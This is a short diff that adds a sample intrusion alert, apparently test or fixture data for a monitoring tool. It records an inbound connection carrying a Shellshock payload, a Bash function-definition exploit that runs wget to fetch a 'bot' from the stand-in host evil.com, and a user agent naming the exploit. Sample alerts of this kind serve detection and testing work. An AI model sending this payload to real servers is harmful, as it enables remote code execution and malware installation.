@@ -1,0 +1,4 @@
+[ALERT] INBOUND TCP CONNECTION
+IP: 41.90.12.77
+PAYLOAD: '() { :;}; /bin/bash -c "wget http://evil.com/bot"'
+USER_AGENT: 'ShellShock-Exploit/1.0'
